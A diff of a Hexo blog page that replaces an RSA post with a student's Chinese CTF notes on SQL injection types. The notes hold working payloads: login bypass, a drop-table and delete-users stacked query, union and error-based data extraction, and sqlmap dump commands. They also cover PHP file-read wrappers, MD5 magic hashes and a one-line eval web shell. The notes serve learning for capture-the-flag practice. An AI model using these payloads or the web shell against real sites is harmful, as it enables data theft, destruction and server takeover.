@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="rsa加密算法, 黛色若梦">
+    <meta name="keywords" content="sql, shiango">
     <meta name="description" content="A Freshman">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>rsa加密算法 | 黛色若梦</title>
+    <title>sql | shiango</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -29,7 +29,7 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="黛色若梦" type="application/atom+xml">
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="shiango" type="application/atom+xml">
 </head>
 
 
@@ -44,7 +44,7 @@
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">黛色若梦</span>
+                    <span class="logo-span">shiango</span>
                 </a>
             </div>
             
@@ -143,7 +143,7 @@
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">黛色若梦</div>
+        <div class="logo-name">shiango</div>
         <div class="logo-desc">
             
             A Freshman
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">rsa加密算法</h1>
+                    <h1 class="description center-align post-title">sql</h1>
                 </div>
             </div>
         </div>
@@ -432,8 +432,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/">
-                                <span class="chip bg-color">补充知识</span>
+                            <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+                                <span class="chip bg-color">基础知识</span>
                             </a>
                         
                     </div>
@@ -448,7 +448,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-10-22
+                    2022-02-23
                 </div>
                 
 
@@ -469,7 +469,151 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="RSA加密算法"><a href="#RSA加密算法" class="headerlink" title="RSA加密算法"></a>RSA加密算法</h1><p>算法描述：<br>（1）选择一对不同的、足够大的素数p，q。<br>（2）计算n=pq。<br>（3）计算f(n)=(p-1)(q-1)，同时对p, q严加保密，不让任何人知道。<br>（4）找一个与f(n)互质的数e，且1&lt;e&lt;f(n)。<br>（5）计算d，使得d·e≡1 mod f(n)。<br>这里要解释一下，≡是数论中表示同余的符号。公式中，≡符号的左边必须和符号右边同余，也就是两边模运算结果相同。显而易见，不管f(n)取什么值，符号右边1 mod f(n)的结果都等于1；符号的左边d与e的乘积做模运算后的结果也必须等于1。这就需要计算出d的值，让这个同余等式能够成立。<br>（6）公钥KU=(e,n)，私钥KR=(d,n)。<br>（7）加密时，先将明文变换成0至n-1的一个整数M。若明文较长，可先分割成适当的组，然后再进行交换。设密文为C，则加密过程为：C≡M^e mod(n)。<br>（8）解密过程为：M≡C^dmod (n) 。</p>
+                <h2 id="sql注入类型总结："><a href="#sql注入类型总结：" class="headerlink" title="sql注入类型总结："></a>sql注入类型总结：</h2><p>文中只举例mysql数据库。</p>
+<p>SQL注入原理</p>
+<p>大多数数据库都会遵循SQL标准，但是每一种数据库都有自己的单行函数及特性。登录表单的登录处最终调用findAdmin方法。找出代码执行中语法存在漏洞的地方。</p>
+<ul>
+<li>正常情况下执行的语句：</li>
+</ul>
+<p>select count (*) from admin where username=’admin’ and password=’password’</p>
+<p>存在admin用户，并且密码为password，所以此时返回结果为“1”，大于0，通过验证，用户登录成功。</p>
+<ul>
+<li>而下面这个语句：</li>
+</ul>
+<p>select count(*) from admin where username=’ ‘ or 1=1– ‘ and password=’ ‘  </p>
+<ul>
+<li>由开发人员本意来理解SQL语句的本义是：</li>
+</ul>
+<p>username=’账户’ and password=’密码’</p>
+<p>现在成为username=’账户’ or 1=1– ‘ and password=’ ‘                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          </p>
+<ul>
+<li>password被注释掉了，执行的SQL语句相当于：</li>
+</ul>
+<p>select count（*）from admin</p>
+<ul>
+<li>SQL语句支持多语句执行，所以这里可以直接删除admin表</li>
+</ul>
+<p>‘ or  1=1;drop table admin –</p>
+<ul>
+<li>SQL漏洞形成原因就是：用户输入的数据被SQL解释器执行。</li>
+</ul>
+<p>注释符<img src="../images/Mysql%25E6%25B3%25A8%25E9%2587%258A%25E7%25AC%25A6-16360892832361.png" alt="Mysql注释符"></p>
+<p>2.在URL里–空格要用–+代替 ，中查询参数名和参数值中空格要用加号+替代，所以几乎所有使用该规范的浏览器在表单提交后，URL查询参数中空格都会被编成加号+。而在另一份规范(RFC 2396，定义URI)里, URI里的保留字符都需转义成%HH格式(Section 3.4 Query Component)，因此空格会被编码成%20，加号+本身也作为保留字而被编成%2B，对于某些遵循RFC 2396标准的应用来说，它可能不接受查询字符串中出现加号+，认为它是非法字符。</p>
+<p>3.有关逻辑运算 and 优先级大于or</p>
+<p>我们可以用 ’or 1=1# 作为密码输入。原因是为什么？<br>这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的 sql 语句为：<br>Select * from admin where username=’admin’ and password=’’or 1=1#’<br>Explain:上面的这个语句执行后，我们在不知道密码的情况下就登录到了 admin 用户了。<br>原 因 是 在 where 子 句 后 ， 我 们 可 以 看 到 三 个 条 件 语 句 username= ’ admin’ and<br>password= ’ ’or 1=1 。三个条件用 and 和 or 进行连接。在 sql 中，我们 and 的运算优先<br>级大于 or 的元算优先级。因此可以看到 第一个条件（用 a 表示）是真的，第二个条件（用<br>b 表示）是假的，a and b = false,第一个条件和第二个条件执行 and 后是假，再与第三<br>个条件 or 运算，因为第三个条件 1=1 是恒成立的，所以结果自然就为真了。</p>
+<h3 id="1-原理："><a href="#1-原理：" class="headerlink" title="1.原理："></a>1.原理：</h3><p>客户端数据未经过转义或处理直接带入数据库，造成了sql注入。</p>
+<h3 id="2-常规模板："><a href="#2-常规模板：" class="headerlink" title="2.常规模板："></a>2.常规模板：</h3><h4 id="（1）判断注入点"><a href="#（1）判断注入点" class="headerlink" title="（1）判断注入点"></a>（1）判断注入点</h4><p>字符型：’a’,”a”,(a),(‘a’),(“a”),((“a”)),((‘a’))等。</p>
+<p>数字型：1</p>
+<p>判断：</p>
+<p>一、id=x 加上注释符– （这里是空格，但是在url后要用+），-+，/**/,#(表单常用)</p>
+<p>二、id=1’&amp;&amp;’1’=’1</p>
+<p>id=1’ and ‘1’=’1</p>
+<p>这样构造一个闭合类型。</p>
+<h4 id="（2）获取字段数"><a href="#（2）获取字段数" class="headerlink" title="（2）获取字段数"></a>（2）获取字段数</h4><p>order by </p>
+<p>通过页面变化来查看确定字段数</p>
+<h4 id="（3）一般用联合查询查看显示位"><a href="#（3）一般用联合查询查看显示位" class="headerlink" title="（3）一般用联合查询查看显示位"></a>（3）一般用联合查询查看显示位</h4><p>查看当前数据库</p>
+<p>id=0  union select database(),2,3–+</p>
+<p>爆表：</p>
+<p>id=0 union selelct 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+</p>
+<p>爆列：</p>
+<p>0 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’xxx’–+(有时候爆破没有回显还要用十六进制试一下)</p>
+<p>爆字段：</p>
+<p>0 union select 1,2,group_concat(id,’~’,user) from (表名)–+</p>
+<h3 id="3-类型："><a href="#3-类型：" class="headerlink" title="3.类型："></a>3.类型：</h3><p>（1）参数：字符型，数字型</p>
+<p>（2）提交方式：post，get，cookie，X-Forward-For,User-Agent请求头</p>
+<h4 id="（3）注入方式与应用场景："><a href="#（3）注入方式与应用场景：" class="headerlink" title="（3）注入方式与应用场景："></a>（3）注入方式与应用场景：</h4><h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p>如以上所示，但是要注意的是可能出现一些waf（正则或转义或过滤）阻止我们使用union，这时候我们就根据不同的可能性选择不同方法。这种时候绝大多数是找到一种其他的方法来注入。</p>
+<h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>这种题目特征是只有判断出内容真假的回显，没有回显打印内容，报错出内容</p>
+<p>具体的函数作用内容在lesson1-10，我就不赘述了。</p>
+<p>然后我们看一下padload：</p>
+<p>updatexml或extractvalue</p>
+<p>爆表</p>
+<p>0 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))–+</p>
+<p>爆列</p>
+<p>0 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from imformation_schema.columns where table_name=’xxx’)))–+</p>
+<p>爆字段</p>
+<p>0 and extractvalue(1,concat(0x7e,(select group_concat(xx,0x7e,xx) from table)))–+</p>
+<p>但是问题是这些函数只能查询32位，所以我们要用substr()或mid(xxx,33,32)从33位开始截取。</p>
+<h5 id="多语句注入（堆叠注入）"><a href="#多语句注入（堆叠注入）" class="headerlink" title="多语句注入（堆叠注入）"></a>多语句注入（堆叠注入）</h5><p>原因：没有经过严格过滤mysqli_multi_query函数，可以执行多条SQL语句。mysql_real_escape_string()转义过滤。</p>
+<p>用;隔开每一个输入语句，有存在局限的就是它其实如果权限不足会导致无法修改数据。</p>
+<p>如:</p>
+<p>id=1”;WAITFOR DELAY ‘0:0:3’;delete from users; –+id=1’;select if(length(user(),1,1)&gt;1,sleep(3),1) %23’;select if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;1,sleep(3),1) %23</p>
+<h5 id="内联注入"><a href="#内联注入" class="headerlink" title="内联注入"></a>内联注入</h5><p>这是一种waf的绕过姿势。</p>
+<p>id=-1 /!UNION/ /!SELECT/ 1,2,3</p>
+<p>会执行/!/里面的内容。</p>
+<h5 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h5><p>代码中有urldecode() 函数</p>
+<p>%2527 先解码成%27再解码成’单引号</p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://192.168.100.141/index.php/author=123">http://192.168.100.141/index.php/author=123</a> –prefix “%2527” –suffix “%23”<br>-prefix为设置前缀 -suffix为设置后缀</p>
+<p>设置后缀，防止sqlmap使用内联注</p>
+<h5 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h5><p>报错注入的情况也适用于布尔盲注（只有判断出内容真假的回显，没有回显打印内容），了解一下基本过程然后直接上脚本爆破。</p>
+<p>利用substr()来使用截取判断，还可以用ascii()将其转换成数字，然后就可以用二分法。脚本只是模板，具体情况要根据题目的waf等来判断实现。</p>
+<h5 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h5><p>适用于与bool一样（只有判断出内容真假的回显，没有回显打印内容）</p>
+<p>利用if()和sleep()函数来实现</p>
+<p>Sleep()  :延迟函数</p>
+<p> <strong>If</strong>(condition,true,false) :条件语句 </p>
+<h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>原理是先编码后转义，GBK 占用两字节</p>
+<p>ASCII占用一字节</p>
+<p>PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。</p>
+<p>大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。</p>
+<p>如列数测试：</p>
+<p>id=%df%27 union select 1,2%23</p>
+<p>预防：使用mysql_set_charset(GBK)指定字符集</p>
+<p>使用myql_real_escape_string()进行转义，他会考虑当前字符集设置</p>
+<h5 id="二次转义注入"><a href="#二次转义注入" class="headerlink" title="二次转义注入"></a>二次转义注入</h5><p>后端（PHP）代码对语句进行了转义</p>
+<p>保存进数据库（mysql）时没有转义，是原语句</p>
+<p>‘#被转义成了其他的东西，所以一次注入无效。<br>但是在保存进数据库的时候，还是admin ‘#。</p>
+<p>那么修改密码时的语句如下：</p>
+<p>update users set  password=’123’ where username=’admin ‘#’<br>所以你以为修改的是admin ‘#的账号，但是数据库理解成要修改密码的账号是admin。</p>
+<h3 id="4-一些waf类型"><a href="#4-一些waf类型" class="headerlink" title="4.一些waf类型"></a>4.一些waf类型</h3><p>过滤掉什么：</p>
+<p>flag   union  ‘  ,  </p>
+<p>这里分成白盒和黑盒</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cute-puli/p/11146625.html">SQL注入绕过waf的一万种姿势 - 铺哩 - 博客园 (cnblogs.com)</a></p>
+<p><a href="https://link.csdn.net/?target=https://www.cnblogs.com/backlion/p/8622523.html">(47条消息) csdn - 安全中心</a></p>
+<h3 id="5-解题流程"><a href="#5-解题流程" class="headerlink" title="5.解题流程"></a>5.解题流程</h3><p>更准确的说可以说是题目类型，怎么去判断属于什么类型的题目。遇到参数，表单，过滤可能性。</p>
+<h3 id="6-脚本和sqlmap格式"><a href="#6-脚本和sqlmap格式" class="headerlink" title="6.脚本和sqlmap格式"></a>6.脚本和sqlmap格式</h3><p>sqlmap用法<br>爆库：</p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://xxxxxx/?id=1">http://xxxxxx?id=1</a> –dbs</p>
+<p>爆表：</p>
+<p>python sqlmap.py <a target="_blank" rel="noopener" href="http://xxxxx/?id=1">http://xxxxx?id=1</a> -D xxxx –tables</p>
+<p>爆列：</p>
+<p>python sqlmap.py <a target="_blank" rel="noopener" href="http://xxx/?id=1">http://xxx?id=1</a> -D xxxx -T xxxx –columns</p>
+<p>爆字段：</p>
+<p>python sqlmap.py <a target="_blank" rel="noopener" href="http://xxx/?id=1">http://xxx?id=1</a> -D xxxx -T xxxx -C xxxx –dump</p>
+<p><strong>文件包含：</strong></p>
+<p>?file=XXX.php等是典型的文件包含</p>
+<p>PHP伪协议（文件读取）</p>
+<p>#第一种用法:<br>?file=php://filter/convert.base64-encode/resouce=xxx.php?<br>第二种用法:<br>?file=php://filter/read=convert.base64-encode/resource=xxx.php<br>————————————————</p>
+<h6 id="2-php-input"><a href="#2-php-input" class="headerlink" title="2.php://input"></a>2.php://input</h6><p>代码：?file=php://input<br>在url上后接，之后利用Hackbar通过POST把数据传过去</p>
+<p><strong>PHP小trick：</strong></p>
+<p>一种是md5()函数无法处理数组，所以我们传入数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。</p>
+<p>所以我们可以试试kkeyey1[]=some&amp;kekeyy2[]=lie</p>
+<p>另一种就是之前常用的利用==弱比较，我们常用的两个字符经过MD5加密后的值为0exxxx形式，会被认为是科学计数法，且表示的是0*10的xxx次方，还是零，都是相等的。</p>
+<p>可以套一些</p>
+<p>下列的字符串的MD5值都是0e开头的：</p>
+<p>QNKCDZO</p>
+<p>240610708</p>
+<p>s878926199a</p>
+<p>s155964671a</p>
+<p>s214587387a</p>
+<p>s214587387a</p>
+<p>过滤&lt;?php。</p>
+<p>这一题学到了的是怎么绕过过滤关键字的方法：试试其他的php标记写法</p>
+<p>用网页脚本:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;a&#x27;])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><p>1.piapiapia</p>
+<p>buu自带防扫机制，所以我们没有办法扫得很快</p>
+<p>看看能不能扫出源码，看是白盒（源码泄漏+代码审计）还是黑盒（这里由于字典的稀缺，所以两种都试试）</p>
+<p>fuzz用社区版，因为线程比较小，不然速度太快了。</p>
+<ul>
+<li>-u 指定网址</li>
+<li>-e 指定网站语言</li>
+<li>-w 指定字典</li>
+<li>-r 递归目录（跑出目录后，继续跑目录下面的目录）</li>
+<li>–random-agents 使用随机UA</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u 网址 -e php</span><br></pre></td></tr></table></figure>
+
+<p>py dirsearch.py -u 网址 -e 语言(我一般用*)</p>
+<p>一般出现登录页面都会有注册页面</p>
 
                 
             </div>
@@ -486,7 +630,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">hzk</a>
+                    <a href="/about" rel="external nofollow noreferrer">hz</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -496,7 +640,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/10/22/rsa%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/">http://example.com/2021/10/22/rsa%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</a>
+                    <a href="http://example.com/2022/02/23/sql%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/">http://example.com/2022/02/23/sql%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -509,7 +653,7 @@
                     All articles in this blog are used except for special statements
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     reprint policy. If reproduced, please indicate source
-                    <a href="/about" target="_blank">hzk</a>
+                    <a href="/about" target="_blank">hz</a>
                     !
                 </span>
             </div>
@@ -534,8 +678,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/">
-                                    <span class="chip bg-color">补充知识</span>
+                                <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+                                    <span class="chip bg-color">基础知识</span>
                                 </a>
                             
                         </div>
@@ -711,13 +855,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2021/10/25/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E5%8F%8A%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/">
+                <a href="/2022/03/01/%E8%80%83%E6%A0%B8wp/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="字符编码及进制转换">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="考核wp">
                         
-                        <span class="card-title">字符编码及进制转换</span>
+                        <span class="card-title">考核wp</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -728,23 +872,15 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-25
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-01
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            hzk
+                            hz
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/">
-                        <span class="chip bg-color">理论知识</span>
-                    </a>
-                    
                 </div>
                 
             </div>
@@ -756,13 +892,13 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/10/22/http%E8%AF%B7%E6%B1%82%E5%8D%8F%E8%AE%AE/">
+                <a href="/2022/02/18/web%E5%89%8D%E7%AB%AF--html%E8%AF%AD%E8%A8%80/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="http请求协议">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="html语言--web前端">
                         
-                        <span class="card-title">http请求协议</span>
+                        <span class="card-title">html语言--web前端</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -773,12 +909,12 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-22
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-18
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            hzk
+                            hz
                             
                         </span>
                     </div>
@@ -986,7 +1122,7 @@
                 <span id="year">2019-2022</span>
             
             <span id="year">2019</span>
-            <a href="/about" target="_blank">hzk</a>
+            <a href="/about" target="_blank">hz</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
